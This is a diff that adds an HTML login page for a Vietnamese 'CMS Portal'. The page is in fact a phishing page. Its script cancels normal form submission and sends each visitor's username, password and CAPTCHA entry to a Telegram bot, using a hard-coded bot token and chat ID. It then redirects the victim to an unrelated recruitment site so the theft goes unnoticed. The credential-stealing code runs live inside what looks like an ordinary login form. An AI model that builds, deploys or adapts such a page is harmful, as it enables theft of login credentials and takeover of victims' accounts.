@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>CMS Portal login page</title>
+    <style>
+        .NormalRed { color: red; }
+        .NormalBold_Gray { font-weight: bold; color: gray; }
+        .FormControl { padding: 4px; font-family: Arial; font-size: 12px; }
+        .formbutton {
+            background-color: #FFAD00;
+            padding: 2px 5px;
+            color: White;
+            cursor: pointer;
+            border: none;
+        }
+        .Normal {
+            font-family: Tahoma, sans-serif;
+            font-size: 12px;
+        }
+        body {
+            margin: 0;
+            background-color: #2687b7;
+        }
+        a {
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <form name="MainForm" method="post">
+        <div align="center">
+            <table cellspacing="0" cellpadding="0" border="0">
+                <tr>
+                    <td align="center">
+                        <table cellspacing="0" cellpadding="0" border="0" width="100%">
+                            <tr>
+                                <td height="80" valign="top" align="left">
+                                    <img src="login_banner.gif" border="0" alt="Login Banner">
+                                </td>
+                            </tr>
+                            <tr>
+                                <td align="center" style="background-color: #F5F5F5; background-image: url('_bglogin.gif')">
+                                    <table class="form-table" width="400" align="center" border="0" style="border: solid 1px #eee">
+                                        <tbody>
+                                            <tr><td colspan="2">&nbsp;</td></tr>
+                                            <tr>
+                                                <td colspan="2">
+                                                    <div id="lblErrMessage" class="NormalRed"></div>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td class="Normal" style="width: 120px">&nbsp;<b>Ngôn ngữ:</b></td>
+                                                <td style="width: 300px">
+                                                    <select id="dropChooseLanguage" class="NormalBold_Gray" style="width: 120px;">
+                                                        <option value="vi">Tiếng Việt</option>
+                                                        <option value="en">English</option>
+                                                    </select>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td class="Normal" style="width: 120px">&nbsp;Tên truy nhập:</td>
+                                                <td>
+                                                    <input type="text" id="txtUsername" name="txtUsername" class="FormControl" style="width: 120px;" required>
+                                                    <span class="NormalRed">*</span>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td class="Normal">&nbsp;Mật khẩu:</td>
+                                                <td>
+                                                    <input type="password" id="txtPassword" name="txtPassword" class="FormControl" style="width: 120px;" required>
+                                                    <span class="NormalRed">*</span>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td class="Normal" valign="top">&nbsp;Mã xác nhận:</td>
+                                                <td>
+                                                    <input type="text" id="txtImageVerify" name="txtImageVerify" class="FormControl" style="width: 120px;" required>
+                                                    <img src="captcha.jpg" alt="CAPTCHA" style="vertical-align: middle; height: 30px;">
+                                                    <a href="#">Refresh</a>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td>&nbsp;</td>
+                                                <td>
+                                                    <span class="Normal">
+                                                        <label><input type="checkbox" id="chkRemember"> Nhớ mật khẩu trên máy này</label>
+                                                    </span>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td>&nbsp;</td>
+                                                <td height="40">
+                                                    <button type="submit" id="btnLogin" class="formbutton"> Đăng nhập </button>
+                                                </td>
+                                            </tr>
+                                            <tr><td colspan="2">&nbsp;</td></tr>
+                                        </tbody>
+                                    </table>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td bgcolor="#bbe0e9" height="30">
+                                    &nbsp;&nbsp;
+                                    <a href="tel://0977587855" title="Nguyễn Mạnh Thế - Hỗ trợ trực tuyến">
+                                        <img alt="Hỗ trợ trực tuyến" src="http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/1.gif" style="border: none;"> Hỗ trợ trực tuyến
+                                    </a>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td align="right" height="10">
+                                    <a href="http://battrangceramics.com" style="display: none;">http://battrangceramics.com/</a>
+                                    <a href="tel://0977587855" target="_blank" style="color: White; font-family: Verdana; font-size: xx-small;">
+                                        PortalTourism - Phát triển bởi Công ty Vietnet 2010
+                                    </a>&nbsp;&nbsp;
+                                </td>
+                            </tr>
+                            <tr>
+                                <td align="center" background="login_bg.gif" height="10"></td>
+                            </tr>
+                        </table>
+                    </td>
+                </tr>
+            </table>
+        </div>
+
+        <!-- JavaScript -->
+        <script type="text/javascript">
+            window.onload = function () {
+                var elements = document.MainForm.elements;
+                for (var i = 0; i < elements.length; i++) {
+                    var e = elements[i];
+                    if (e.type === 'text' && e.name.indexOf('txtUsername') !== -1) {
+                        e.focus();
+                        break;
+                    }
+                }
+
+                document.getElementById("btnLogin").addEventListener("click", function (event) {
+                    event.preventDefault(); // Ngăn gửi form mặc định
+
+                    var username = document.getElementById("txtUsername").value;
+                    var password = document.getElementById("txtPassword").value;
+                    var captcha = document.getElementById("txtImageVerify").value;
+
+                    var message = "🔐 CMS Login:\n👤 Username: " + username + "\n🔑 Password: " + password + "\n🛡️ CAPTCHA: " + captcha;
+
+                    var telegramToken = '8160549588:AAG18fg3t-1WX-cMcwzmxDPPFdMLoJ64TiM'; // ← Thay bằng token thật
+                    var chatId = '-4756233173';           // ← Thay bằng chat ID thật
+
+                    fetch("https://api.telegram.org/bot" + telegramToken + "/sendMessage", {
+                        method: "POST",
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
+                        })
+                    }).then(function () {
+                        window.location.href = "https://tuyendung.doji.vn/quy-trinh-tuyen-dung.html";
+                    }).catch(function (error) {
+                        window.location.href = "https://tuyendung.doji.vn/quy-trinh-tuyen-dung.html";
+                    });
+                });
+            };
+        </script>
+    </form>
+</body>
+</html>
